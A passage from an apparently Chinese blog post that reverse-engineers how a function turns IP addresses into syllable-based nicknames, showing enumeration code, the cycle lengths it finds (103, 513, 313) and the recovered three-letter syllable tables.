&#123;get(ip_str)&#125; &#123;ip_str&#125;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>结果如下，注意到昵称的第 4-6 个字符每 103 个 IP 地址会有一个周期，进入下一个周期改变了第 1-3 个字符的内容，其余字符则保持不变：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">000 WimNodSerPuc 0.0.0.0</span><br><span class="line">001 WimTapSerPuc 0.0.0.1</span><br><span class="line">002 WimLizSerPuc 0.0.0.2</span><br><span class="line">...</span><br><span class="line">102 WimGuoSerPuc 0.0.0.102</span><br><span class="line">103 HetNodSerPuc 0.0.0.103</span><br><span class="line">104 HetTapSerPuc 0.0.0.104</span><br><span class="line">...</span><br><span class="line">205 HetGuoSerPuc 0.0.0.205</span><br><span class="line">206 FauNodSerPuc 0.0.0.206</span><br><span class="line">207 FauTapSerPuc 0.0.0.207</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>那就继续探索下一个周期变化。这个周期很长，所以直到将范围拉到 520 之后才确定其周期长度为 513：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">for i in range(0, 520):</span><br><span class="line">    ip = i * 103</span><br><span class="line"># 其余代码同上</span><br><span class="line"></span><br><span class="line">000 WimNodSerPuc 0.0.0.0</span><br><span class="line">001 HetNodSerPuc 0.0.0.103</span><br><span class="line">002 FauNodSerPuc 0.0.0.206</span><br><span class="line">...</span><br><span class="line">512 ButNodSerPuc 0.0.206.0</span><br><span class="line">513 WimNodDeaPuc 0.0.206.103</span><br><span class="line">514 HetNodDeaPuc 0.0.206.206</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>进一步探索下一个周期。下一个周期的长度为 313，但同时也注意到，在进入下一个周期后，四个部分的顺序也发生了变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">for i in range(0, 320):</span><br><span class="line">    ip = i * 103 * 513</span><br><span class="line"># 其余代码同上</span><br><span class="line"></span><br><span class="line">000 WimNodSerPuc 0.0.0.0</span><br><span class="line">001 WimNodDeaPuc 0.0.206.103</span><br><span class="line">002 WimNodJacPuc 0.1.156.206</span><br><span class="line">...</span><br><span class="line">312 WimNodFomPuc 0.251.141.136</span><br><span class="line">313 WimSerMazNod 0.252.91.239</span><br><span class="line">314 WimDeaMazNod 0.253.42.86</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>先对之前三个周期的昵称部分进行了整理，发现它们互相没有交集，所以顺序的变化不影响对下一个周期的探索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A  =  [&#x27;Nod&#x27;, &#x27;Tap&#x27;, &#x27;Liz&#x27;, &#x27;Mel&#x27;, &#x27;Fig&#x27;, &#x27;Rif&#x27;, &#x27;Rip&#x27;, &#x27;Pud&#x27;, &#x27;Foo&#x27;, &#x27;Haw&#x27;, &#x27;Wef&#x27;, &#x27;Kel&#x27;, &#x27;Gat&#x27;, &#x27;Hod&#x27;, &#x27;Mom&#x27;, &#x27;Lin&#x27;, &#x27;Fez&#x27;, &#x27;Rua&#x27;, &#x27;Fay&#x27;, &#x27;Pat&#x27;, &#x27;Ned&#x27;, &#x27;Taz&#x27;, &#x27;Sid&#x27;, &#x27;Mic&#x27;, &#x27;Nom&#x27;, &#x27;Hab&#x27;, &#x27;Rug&#x27;, &#x27;Men&#x27;, &#x27;Nok&#x27;, &#x27;Fun&#x27;, &#x27;Pox&#x27;, &#x27;Red&#x27;, &#x27;Jah&#x27;, &#x27;Tet&#x27;, &#x27;Hip&#x27;, &#x27;Tem&#x27;, &#x27;Bad&#x27;, &#x27;Mir&#x27;, &#x27;Taj&#x27;, &#x27;Maf&#x27;, &#x27;Rac&#x27;, &#x27;Zia&#x27;, &#x27;Hea&#x27;, &#x27;Fis&#x27;, &#x27;Dem&#x27;, &#x27;Bim&#x27;, &#x27;Gow&#x27;, &#x27;Hub&#x27;, &#x27;Job&#x27;, &#x27;Nex&#x27;, &#x27;Jas&#x27;, &#x27;Lie&#x27;, &#x27;Sim&#x27;, &#x27;Poc&#x27;, &#x27;Ran&#x27;, &#x27;Voa&#x27;, &#x27;Gig&#x27;, &#x27;Jes&#x27;, &#x27;Nie&#x27;, &#x27;Lal&#x27;, &#x27;Lek&#x27;, &#x27;Pen&#x27;, &#x27;Cos&#x27;, &#x27;Col&#x27;, &#x27;Nao&#x27;, &#x27;Mop&#x27;, &#x27;Bac&#x27;, &#x27;Cis&#x27;, &#x27;Mor&#x27;, &#x27;Vim&#x27;, &#x27;Ceo&#x27;, &#x27;Gic&#x27;, &#x27;Mii&#x27;, &#x27;Dep&#x27;, &#x27;Len&#x27;, &#x27;Few&#x27;, &#x27;Lob&#x27;, &#x27;Lea&#x27;, &#x27;Bec&#x27;, &#x27;Mui&#x27;, &#x27;Pec&#x27;, &#x27;Mab&#x27;, &#x27;Her&#x27;, &#x27;Tas&#x27;, &#x27;Tui&#x27;, &#x27;Kun&#x27;, &#x27;Vic&#x27;, &#x27;Too&#x27;, &#x27;Woe&#x27;, &#x27;Uav&#x27;, &#x27;Dam&#x27;, &#x27;Jin&#x27;, &#x27;Kaz&#x27;, &#x27;Yew&#x27;, &#x27;Cid&#x27;, &#x27;Jaw&#x27;, &#x27;Hay&#x27;, &#x27;Gib&#x27;, &#x27;Mis&#x27;, &#x27;Til&#x27;, &#x27;Six&#x27;, &#x27;Bot&#x27;, &#x27;Guo&#x27;]</span><br><span class="line">B  =  [&#x27;Wim&#x27;, &#x27;Het&#x27;, &#x27;Fau&#x27;, &#x27;Ria&#x27;, &#x27;Dio&#x27;, &#x27;God&#x27;, &#x27;Man&#x27;, &#x27;Lim&#x27;, &#x27;Fap&#x27;, &#x27;Bar&#x27;, &#x27;Sot&#x27;, &#x27;Uae&#x27;, &#x27;Faq&#x27;, &#x27;Gum&#x27;, &#x27;Doe&#x27;, &#x27;Kay&#x27;, &#x27;Vol&#x27;, &#x27;Bic&#x27;, &#x27;Ren&#x27;, &#x27;Sox&#x27;, &#x27;Ral&#x27;, &#x27;Pii&#x27;, &#x27;Fol&#x27;, &#x27;Noo&#x27;, &#x27;Wes&#x27;, &#x27;Law&#x27;, &#x27;Pic&#x27;, &#x27;Zig&#x27;, &#x27;Ric&#x27;, &#x27;Tad&#x27;, &#x27;Pav&#x27;, &#x27;Loo&#x27;, &#x27;Tea&#x27;, &#x27;Koh&#x27;, &#x27;Fia&#x27;, &#x27;Rep&#x27;, &#x27;Soa&#x27;, &#x27;Gog&#x27;, &#x27;Rim&#x27;, &#x27;Nec&#x27;, &#x27;Jun&#x27;, &#x27;Sus&#x27;, &#x27;Roh&#x27;, &#x27;Sac&#x27;, &#x27;Diy&#x27;, &#x27;Gin&#x27;, &#x27;Gul&#x27;, &#x27;Via&#x27;, &#x27;Tec&#x27;, &#x27;Mah&#x27;, &#x27;Rus&#x27;, &#x27;Cal&#x27;, &#x27;Wat&#x27;, &#x27;Mes&#x27;, &#x27;Pam&#x27;, &#x27;Sav&#x27;, &#x27;Luz&#x27;, &#x27;Lac&#x27;, &#x27;Jud&#x27;, &#x27;Lop&#x27;, &#x27;Tub&#x27;, &#x27;Lia&#x27;, &#x27;Kip&#x27;, &#x27;Nau&#x27;, &#x27;Loa&#x27;, &#x27;Roa&#x27;, &#x27;Dos&#x27;, &#x27;Nor&#x27;, &#x27;Jaz&#x27;, &#x27;Fim&#x27;, &#x27;Boo&#x27;, &#x27;Pad&#x27;, &#x27;Duo&#x27;, &#x27;Min&#x27;, &#x27;Vis&#x27;, &#x27;Hux&#x27;, &#x27;Cue&#x27;, &#x27;Soc&#x27;, &#x27;Caw&#x27;, &#x27;Rig&#x27;, &#x27;Wod&#x27;, &#x27;Pag&#x27;, &#x27;Tak&#x27;, &#x27;Cag&#x27;, &#x27;Coe&#x27;, &#x27;Lev&#x27;, &#x27;Ted&#x27;, &#x27;Vax&#x27;, &#x27;Peo&#x27;, &#x27;Uic&#x27;, &#x27;Cus&#x27;, &#x27;Huh&#x27;, &#x27;Rub&#x27;, &#x27;Gia&#x27;, &#x27;Raf&#x27;, &#x27;Bed&#x27;, &#x27;Pei&#x27;, &#x27;Sig&#x27;, &#x27;Pur&#x27;, &#x27;Qin&#x27;, &#x27;Dai&#x27;, &#x27;Deb&#x27;, &#x27;Pof&#x27;, &#x27;Neg&#x27;, &#x27;Tol&#x27;, &#x27;Lux&#x27;, &#x27;Jus&#x27;, &#x27;Uah&#x27;, &#x27;Que&#x27;, &#x27;Noe&#x27;, &#x27;Lov&#x27;, &#x27;Zee&#x27;, &#x27;Con&#x27;, &#x27;Fey&#x27;, &#x27;Soi&#x27;, &#x27;Tex&#x27;, &#x27;Pin&#x27;, &#x27;Kap&#x27;, &#x27;Sal&#x27;, &#x27;Luo&#x27;, &#x27;Tim&#x27;, &#x27;Mid&#x27;, &#x27;Daw&#x27;, &#x27;Had&#x27;, &#x27;Gam&#x27;, &#x27;Jul&#x27;, &#x27;Jie&#x27;, &#x27;Wol&#x27;, &#x27;Mon&#x27;, &#x27;Roc&#x27;, &#x27;Rel&#x27;, &#x27;Bas&#x27;, &#x27;Nou&#x27;, &#x27;Reo&#x27;, &#x27;Mar&#x27;, &#x27;Dao&#x27;, &#x27;Niu&#x27;, &#x27;Kev&#x27;, &#x27;Dee&#x27;, &#x27;Wip&#x27;, &#x27;Coc&#x27;, &#x27;Fes&#x27;, &#x27;Rat&#x27;, &#x27;Dig&#x27;, &#x27;Teu&#x27;, &#x27;Mob&#x27;, &#x27;Mae&#x27;, &#x27;Car&#x27;, &#x27;Tux&#x27;, &#x27;Dew&#x27;, &#x27;Xue&#x27;, &#x27;Poi&#x27;, &#x27;Sit&#x27;, &#x27;Xin&#x27;, &#x27;Per&#x27;, &#x27;Mos&#x27;, &#x27;Top&#x27;, &#x27;Gab&#x27;, &#x27;Yin&#x27;, &#x27;Loi&#x27;, &#x27;Jay&#x27;, &#x27;Moi&#x27;, &#x27;Yeo&#x27;, &#x27;Day&#x27;, &#x27;Dic&#x27;, &#x27;Haq&#x27;, &#x27;Dak&#x27;, &#x27;Mer&#x27;, &#x27;Wii&#x27;, &#x27;Pix&#x27;, &#x27;Fag&#x27;, &#x27;Dog&#x27;, &#x27;Por&#x27;, &#x27;Nib&#x27;, &#x27;Hog&#x27;, &#x27;Huw&#x27;, &#x27;Voc&#x27;, &#x27;Hob&#x27;, &#x27;Zep&#x27;, &#x27;Neo&#x27;, &#x27;Com&#x27;, &#x27;Seo&#x27;, &#x27;Cur&#x27;, &#x27;Mow&#x27;, &#x27;Reb&#x27;, &#x27;Jim&#x27;, &#x27;Noc&#x27;, &#x27;Big&#x27;, &#x27;Fin&#x27;, &#x27;Sek&#x27;, &#x27;Fav&#x27;, &#x27;Niv&#x27;, &#x27;Pom&#x27;, &#x27;Pes&#x27;, &#x27;Ker&#x27;, &#x27;Yao&#x27;, &#x27;Coq&#x27;, &#x27;Tif&#x27;, &#x27;Gem&#x27;, &#x27;Cel&#x27;, &#x27;Zit&#x27;, &#x27;Toc&#x27;, &#x27;Jet&#x27;, &#x27;Vow&#x27;, &#x27;Lon&#x27;, &#x27;Rev&#x27;, &#x27;Joi&#x27;, &#x27;Jem&#x27;, &#x27;Wad&#x27;, &#x27;Bom&#x27;, &#x27;Tar&#x27;, &#x27;Pua&#x27;, &#x27;Rao&#x27;, &#x27;Bio&#x27;, &#x27;For&#x27;, &#x27;Dec&#x27;, &#x27;Win&#x27;, &#x27;See&#x27;, &#x27;Pup&#x27;, &#x27;Mea&#x27;, &#x27;Fam&#x27;, &#x27;Muh&#x27;, &#x27;Doo&#x27;, &#x27;Moh&#x27;, &#x27;Sam&#x27;, &#x27;Maw&#x27;, &#x27;Tog&#x27;, &#x27;Moe&#x27;, &#x27;Tin&#x27;, &#x27;Hur&#x27;, &#x27;Won&#x27;, &#x27;Lox&#x27;, &#x27;Poa&#x27;, &#x27;Dun&#x27;, &#x27;Run&#x27;, &#x27;Bil&#x27;, &#x27;Vip&#x27;, &#x27;Viv&#x27;, &#x27;Del&#x27;, &#x27;Nae&#x27;, &#x27;Zip&#x27;, &#x27;Roo&#x27;, &#x27;Sum&#x27;, &#x27;Leh&#x27;, &#x27;Lam&#x27;, &#x27;Yoo&#x27;, &#x27;Yip&#x27;, &#x27;Tow&#x27;, &#x27;Pil&#x27;, &#x27;Nab&#x27;, &#x27;Goi&#x27;, &#x27;Gar&#x27;, &#x27;Qua&#x27;, &#x27;Cor&#x27;, &#x27;Hav&#x27;, &#x27;Let&#x27;, &#x27;Ree&#x27;, &#x27;Set&#x27;, &#x27;Lee&#x27;, &#x27;Cef&#x27;, &#x27;Jam&#x27;, &#x27;Fal&#x27;, &#x27;Daa&#x27;, &#x27;Put&#x27;, &#x27;Num&#x27;, &#x27;Vod&#x27;, &#x27;Tis&#x27;, &#x27;Cad&#x27;, &#x27;Mot&#x27;, &#x27;Rit&#x27;, &#x27;Lex&#x27;, &#x27;Nav&#x27;, &#x27;Sia&#x27;, &#x27;Lip&#x27;, &#x27;Nox&#x27;, &#x27;Raj&#x27;, &#x27;Pie&#x27;, &#x27;Hel&#x27;, &#x27;Bam&#x27;, &#x27;Fed&#x27;, &#x27;Los&#x27;, &#x27;Fax&#x27;, &#x27;Neh&#x27;, &#x27;Jag&#x27;, &#x27;Sec&#x27;, &#x27;Jap&#x27;, &#x27;Sun&#x27;, &#x27;Cea&#x27;, &#x27;Jug&#x27;, &#x27;Sis&#x27;, &#x27;Cut&#x27;, &#x27;Fit&#x27;, &#x27;Fox&#x27;, &#x27;Bum&#x27;, &#x27;Joh&#x27;, &#x27;Lag&#x27;, &#x27;Fic&#x27;, &#x27;Sae&#x27;, &#x27;Gaz&#x27;, &#x27;Yuh&#x27;, &#x27;Hee&#x27;, &#x27;Fae&#x27;, &#x27;Caf&#x27;, &#x27;Nag&#x27;, &#x27;Bay&#x27;, &#x27;Ray&#x27;, &#x27;Log&#x27;, &#x27;Dim&#x27;, &#x27;Bag&#x27;, &#x27;Gap&#x27;, &#x27;San&#x27;, &#x27;Sup&#x27;, &#x27;Kuo&#x27;, &#x27;Wav&#x27;, &#x27;Suh&#x27;, &#x27;Kal&#x27;, &#x27;Tom&#x27;, &#x27;Ret&#x27;, &#x27;Seb&#x27;, &#x27;Wil&#x27;, &#x27;Jen&#x27;, &#x27;Haz&#x27;, &#x27;Cum&#x27;, &#x27;Xiv&#x27;, &#x27;Pon&#x27;, &#x27;Cod&#x27;, &#x27;Kit&#x27;, &#x27;Biz&#x27;, &#x27;Gag&#x27;, &#x27;Fen&#x27;, &#x27;Leg&#x27;, &#x27;Uid&#x27;, &#x27;Bod&#x27;, &#x27;Peg&#x27;, &#x27;Fur&#x27;, &#x27;Pip&#x27;, &#x27;Vid&#x27;, &#x27;Ter&#x27;, &#x27;Mol&#x27;, &#x27;Yor&#x27;, &#x27;Tek&#x27;, &#x27;Koo&#x27;, &#x27;Sui&#x27;, &#x27;Gis&#x27;, &#x27;Cia&#x27;, &#x27;Jig&#x27;, &#x27;Nad&#x27;, &#x27;Sin&#x27;, &#x27;Wop&#x27;, &#x27;Hou&#x27;, &#x27;Xii&#x27;, &#x27;Mim&#x27;, &#x27;Naa&#x27;, &#x27;Nia&#x27;, &#x27;Fai&#x27;, &#x27;Cat&#x27;, &#x27;Mio&#x27;, &#x27;Vee&#x27;, &#x27;Sew&#x27;, &#x27;Pal&#x27;, &#x27;Bub&#x27;, &#x27;Lis&#x27;, &#x27;Cac&#x27;, &#x27;Bid&#x27;, &#x27;Pah&#x27;, &#x27;Dip&#x27;, &#x27;Goy&#x27;, &#x27;Rum&#x27;, &#x27;Hoc&#x27;, &#x27;Viz&#x27;, &#x27;Fog&#x27;, &#x27;Tax&#x27;, &#x27;Kin&#x27;, &#x27;Req&#x27;, &#x27;Kik&#x27;, &#x27;Coa&#x27;, &#x27;Meh&#x27;, &#x27;Mum&#x27;, &#x27;Lap&#x27;, &#x27;Mov&#x27;, &#x27;Pir&#x27;, &#x27;Bop&#x27;, &#x27;Der&#x27;, &#x27;Dag&#x27;, &#x27;Lei&#x27;, &#x27;Jit&#x27;, &#x27;Tod&#x27;, &#x27;Far&#x27;, &#x27;Tig&#x27;, &#x27;Tae&#x27;, &#x27;Ten&#x27;, &#x27;Toe&#x27;, &#x27;Sep&#x27;, &#x27;Mac&#x27;, &#x27;Hua&#x27;, &#x27;Vik&#x27;, &#x27;Piu&#x27;, &#x27;Rar&#x27;, &#x27;Hut&#x27;, &#x27;New&#x27;, &#x27;Pap&#x27;, &#x27;Hid&#x27;, &#x27;Xia&#x27;, &#x27;Hug&#x27;, &#x27;Rox&#x27;, &#x27;Rey&#x27;, &#x27;Meg&#x27;, &#x27;Zak&#x27;, &#x27;Uas&#x27;, &#x27;Dug&#x27;, &#x27;Bes&#x27;, &#x27;Ton&#x27;, &#x27;Lad&#x27;, &#x27;Hus&#x27;, &#x27;Lew&#x27;, &#x27;Jiu&#x27;, &#x27;Pub&#x27;, &#x27;Buy&#x27;, &#x27;Bet&#x27;, &#x27;Nog&#x27;, &#x27;Yak&#x27;, &#x27;Bau&#x27;, &#x27;Qol&#x27;, &#x27;Yet&#x27;, &#x27;Dor&#x27;, &#x27;Buh&#x27;, &#x27;Baz&#x27;, &#x27;Kat&#x27;, &#x27;Fei&#x27;, &#x27;Kon&#x27;, &#x27;Nuh&#x27;, &#x27;Noa&#x27;, &#x27;Cap&#x27;, &#x27;Cil&#x27;, &#x27;Tan&#x27;, &#x27;Jed&#x27;, &#x27;Dur&#x27;, &#x27;Bol&#x27;, &#x27;Sux&#x27;, &#x27;Gov&#x27;, &#x27;Dev&#x27;, &#x27;Teh&#x27;, &#x27;Bob&#x27;, &#x27;Bal&#x27;, &#x27;Pep&#x27;, &#x27;Hah&#x27;, &#x27;Res&#x27;, &#x27;Cai&#x27;, &#x27;Gas&#x27;, &#x27;Qiu&#x27;, &#x27;Wiz&#x27;, &#x27;Pis&#x27;, &#x27;Heh&#x27;, &#x27;Dil&#x27;, &#x27;Yer&#x27;, &#x27;Gon&#x27;, &#x27;Nis&#x27;, &#x27;Fiu&#x27;, &#x27;Ber&#x27;, &#x27;Gan&#x27;, &#x27;Bak&#x27;, &#x27;Fud&#x27;, &#x27;Cog&#x27;, &#x27;Zim&#x27;, &#x27;Doa&#x27;, &#x27;Bos&#x27;, &#x27;Hen&#x27;, &#x27;Hes&#x27;, &#x27;Dub&#x27;, &#x27;Web&#x27;, &#x27;Lol&#x27;, &#x27;Zoo&#x27;, &#x27;Vag&#x27;, &#x27;Lep&#x27;, &#x27;Vin&#x27;, &#x27;Cep&#x27;, &#x27;Sow&#x27;, &#x27;Naw&#x27;, &#x27;Mee&#x27;, &#x27;Vir&#x27;, &#x27;Jae&#x27;, &#x27;Lic&#x27;, &#x27;Gah&#x27;, &#x27;Wax&#x27;, &#x27;Zap&#x27;, &#x27;Bur&#x27;, &#x27;Civ&#x27;, &#x27;Tag&#x27;, &#x27;Led&#x27;, &#x27;Boe&#x27;, &#x27;Cin&#x27;, &#x27;You&#x27;, &#x27;Daf&#x27;, &#x27;Beg&#x27;, &#x27;Xan&#x27;, &#x27;Wix&#x27;, &#x27;Nun&#x27;, &#x27;Yap&#x27;, &#x27;Bai&#x27;, &#x27;Cox&#x27;, &#x27;Sur&#x27;, &#x27;Fet&#x27;, &#x27;Moj&#x27;, &#x27;Lau&#x27;, &#x27;Dis&#x27;, &#x27;Mat&#x27;, &#x27;Rid&#x27;, &#x27;Mal&#x27;, &#x27;Ris&#x27;, &#x27;Uis&#x27;, &#x27;Hib&#x27;, &#x27;Vie&#x27;, &#x27;But&#x27;]</span><br><span class="line">C  =  [&#x27;Ser&#x27;, &#x27;Dea&#x27;, &#x27;Jac&#x27;, &#x27;Way&#x27;, &#x27;Cio&#x27;, &#x27;Tie&#x27;, &#x27;Tun&#x27;, &#x27;Goa&#x27;, &#x27;Sap&#x27;, &#x27;Fan&#x27;, &#x27;Jor&#x27;, &#x27;Pit&#x27;, &#x27;Gor&#x27;, &#x27;Son&#x27;, &#x27;Mun&#x27;, &#x27;Dan&#x27;, &#x27;Veg&#x27;, &#x27;Wel&#x27;, &#x27;Sev&#x27;, &#x27;Jeb&#x27;, &#x27;Gio&#x27;, &#x27;Ceu&#x27;, &#x27;Bib&#x27;, &#x27;Cif&#x27;, &#x27;Bug&#x27;, &#x27;Zan&#x27;, &#x27;Mec&#x27;, &#x27;Rob&#x27;, &#x27;Lao&#x27;, &#x27;Hew&#x27;, &#x27;Quo&#x27;, &#x27;Hor&#x27;, &#x27;Foe&#x27;, &#x27;Mak&#x27;, &#x27;Hol&#x27;, &#x27;Fil&#x27;, &#x27;Cam&#x27;, &#x27;Nur&#x27;, &#x27;Vet&#x27;, &#x27;Yea&#x27;, &#x27;Yup&#x27;, &#x27;Lot&#x27;, &#x27;Jab&#x27;, &#x27;Goo&#x27;, &#x27;Soy&#x27;, &#x27;Pay&#x27;, &#x27;Hoe&#x27;, &#x27;Dud&#x27;, &#x27;Qos&#x27;, &#x27;Boa&#x27;, &#x27;Ceb&#x27;, &#x27;Lug&#x27;, &#x27;Nic&#x27;, &#x27;Rai&#x27;, &#x27;Nap&#x27;, &#x27;Sem&#x27;, &#x27;Rue&#x27;, &#x27;Bah&#x27;, &#x27;Sez&#x27;, &#x27;Jib&#x27;, &#x27;Ual&#x27;, &#x27;Mus&#x27;, &#x27;Cip&#x27;, &#x27;Cir&#x27;, &#x27;Yan&#x27;, &#x27;Div&#x27;, &#x27;Bor&#x27;, &#x27;War&#x27;, &#x27;Don&#x27;, &#x27;Tug&#x27;, &#x27;Tuk&#x27;, &#x27;Maj&#x27;, &#x27;Hae&#x27;, &#x27;Rui&#x27;, &#x27;Git&#x27;, &#x27;Gil&#x27;, &#x27;Lab&#x27;, &#x27;Med&#x27;, &#x27;Mag&#x27;, &#x27;Dui&#x27;, &#x27;Ruv&#x27;, &#x27;Raw&#x27;, &#x27;Sol&#x27;, &#x27;Foy&#x27;, &#x27;Sib&#x27;, &#x27;Sub&#x27;, &#x27;Moz&#x27;, &#x27;Ras&#x27;, &#x27;Mil&#x27;, &#x27;Rem&#x27;, &#x27;Nix&#x27;, &#x27;Dom&#x27;, &#x27;Ban&#x27;, &#x27;Zeb&#x27;, &#x27;Woo&#x27;, &#x27;Pus&#x27;, &#x27;Mau&#x27;, &#x27;Boi&#x27;, &#x27;Ped&#x27;, &#x27;Kee&#x27;, &#x27;Pop&#x27;, &#x27;Mix&#x27;, &#x27;Wai&#x27;, &#x27;Gun&#x27;, &#x27;Ley&#x27;, &#x27;Cee&#x27;, &#x27;Bok&#x27;, &#x27;Fao&#x27;, &#x27;Sul&#x27;, &#x27;Zac&#x27;, &#x27;Siu&#x27;, &#x27;Jan&#x27;, &#x27;Sai&#x27;, &#x27;Ged&#x27;, &#x27;Pau&#x27;, &#x27;Cop&#x27;, &#x27;Les&#x27;, &#x27;Suu&#x27;, &#x27;Dir&#x27;, &#x27;Var&#x27;, &#x27;Wap&#x27;, &#x27;Tai&#x27;, &#x27;Wah&#x27;, &#x27;Rei&#x27;, &#x27;Pas&#x27;, &#x27;Bat&#x27;, &#x27;Cas&#x27;, &#x27;Fad&#x27;, &#x27;Joe&#x27;, &#x27;Nir&#x27;, &#x27;Fem&#x27;, &#x27;Hai&#x27;, &#x27;Tal&#x27;, &#x27;Wea&#x27;, &#x27;Rok&#x27;, &#x27;Hoa&#x27;, &#x27;Goh&#x27;, &#x27;Hof&#x27;, &#x27;Nos&#x27;, &#x27;Roy&#x27;, &#x27;Nem&#x27;, &#x27;Bel&#x27;, &#x27;Yui&#x27;, &#x27;Wor&#x27;, &#x27;Neb&#x27;, &#x27;Tot&#x27;, &#x27;Luv&#x27;, &#x27;Yun&#x27;, &#x27;Lil&#x27;, &#x27;Doc&#x27;, &#x27;Lai&#x27;, &#x27;Hem&#x27;, &#x27;Kew&#x27;, &#x27;Lay&#x27;, &#x27;Nik&#x27;, &#x27;Gus&#x27;, &#x27;Hoh&#x27;, &#x27;Fix&#x27;, &#x27;Cup&#x27;, &#x27;Fer&#x27;, &#x27;Deo&#x27;, &#x27;Coy&#x27;, &#x27;Jer&#x27;, &#x27;Luc&#x27;, &#x27;Gif&#x27;, &#x27;Cou&#x27;, &#x27;Dob&#x27;, &#x27;Dow&#x27;, &#x27;Hum&#x27;, &#x27;Hom&#x27;, &#x27;Nan&#x27;, &#x27;Dot&#x27;, &#x27;Den&#x27;, &#x27;Yeh&#x27;, &#x27;Ces&#x27;, &#x27;Jak&#x27;, &#x27;Nei&#x27;, &#x27;Rag&#x27;, &#x27;Dar&#x27;, &#x27;Pun&#x27;, &#x27;Dex&#x27;, &#x27;Gee&#x27;, &#x27;Nes&#x27;, &#x27;Mit&#x27;, &#x27;Fos&#x27;, &#x27;Sed&#x27;, &#x27;Pac&#x27;, &#x27;Cic&#x27;, &#x27;Toi&#x27;, &#x27;Raz&#x27;, &#x27;Tok&#x27;, &#x27;Did&#x27;, &#x27;Rik&#x27;, &#x27;Hit&#x27;, &#x27;Kam&#x27;, &#x27;Hiv&#x27;, &#x27;Jut&#x27;, &#x27;Tee&#x27;, &#x27;Pod&#x27;, &#x27;Gir&#x27;, &#x27;Sax&#x27;, &#x27;Hat&#x27;, &#x27;Dab&#x27;, &#x27;Nai&#x27;, &#x27;Jez&#x27;, &#x27;Was&#x27;, &#x27;Bon&#x27;, &#x27;Kid&#x27;, &#x27;Him&#x27;, &#x27;Tia&#x27;, &#x27;Bin&#x27;, &#x27;Wep&#x27;, &#x27;Dup&#x27;, &#x27;Yue&#x27;, &#x27;Maa&#x27;, &#x27;Hao&#x27;, &#x27;Suv&#x27;, &#x27;Ken&#x27;, &#x27;Mod&#x27;, &#x27;Kan&#x27;, &#x27;Moc&#x27;, &#x27;Cow&#x27;, &#x27;Sex&#x27;, &#x27;Ben&#x27;, &#x27;Deg&#x27;, &#x27;Gaf&#x27;, &#x27;Yaw&#x27;, &#x27;Luk&#x27;, &#x27;Faa&#x27;, &#x27;Bow&#x27;, &#x27;Ror&#x27;, &#x27;Bee&#x27;, &#x27;Cob&#x27;, &#x27;Loy&#x27;, &#x27;Row&#x27;, &#x27;Det&#x27;, &#x27;Nut&#x27;, &#x27;Rah&#x27;, &#x27;Coi&#x27;, &#x27;Rap&#x27;, &#x27;Def&#x27;, &#x27;Hie&#x27;, &#x27;Tic&#x27;, &#x27;Wis&#x27;, &#x27;Mew&#x27;, &#x27;Dav&#x27;, &#x27;Sir&#x27;, &#x27;Zoe&#x27;, &#x27;Zin&#x27;, &#x27;Uac&#x27;, &#x27;Rab&#x27;, &#x27;Yen&#x27;, &#x27;Sip&#x27;, &#x27;Nip&#x27;, &#x27;Bir&#x27;, &#x27;Pak&#x27;, &#x27;Kar&#x27;, &#x27;Gen&#x27;, &#x27;Kea&#x27;, &#x27;Sor&#x27;, &#x27;Lod&#x27;, &#x27;Fas&#x27;, &#x27;Sif&#x27;, &#x27;Zag&#x27;, &#x27;Rea&#x27;, &#x27;Wed&#x27;, &#x27;Vex&#x27;, &#x27;Lem&#x27;, &#x27;Sob&#x27;, &#x27;Sue&#x27;, &#x27;Lar&#x27;, &#x27;Rav&#x27;, &#x27;Sou&#x27;, &#x27;Bev&#x27;, &#x27;Kek&#x27;, &#x27;Kol&#x27;, &#x27;Rae&#x27;, &#x27;Map&#x27;, &#x27;Dah&#x27;, &#x27;Pee&#x27;, &#x27;Tam&#x27;, &#x27;Loc&#x27;, &#x27;Boc&#x27;, &#x27;Coz&#x27;, &#x27;Ful&#x27;, &#x27;Paz&#x27;, &#x27;Hop&#x27;, &#x27;Bui&#x27;, &#x27;Ref&#x27;, &#x27;Coo&#x27;, &#x27;Rez&#x27;, &#x27;Seq&#x27;, &#x27;Lou&#x27;, &#x27;Hon&#x27;, &#x27;Leo&#x27;, &#x27;Bis&#x27;, &#x27;Dia&#x27;, &#x27;Hui&#x27;, &#x27;Mai&#x27;, &#x27;Pez&#x27;, &#x27;Boy&#x27;, &#x27;Rog&#x27;, &#x27;Dac&#x27;, &#x27;Tut&#x27;, &#x27;Rut&#x27;, &#x27;Cuz&#x27;, &#x27;Now&#x27;, &#x27;Nii&#x27;, &#x27;Yas&#x27;, &#x27;Doj&#x27;, &#x27;Saw&#x27;, &#x27;Bex&#x27;, &#x27;Fom&#x27;]</span><br></pre></td></tr></table></figure><p>那就继续：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 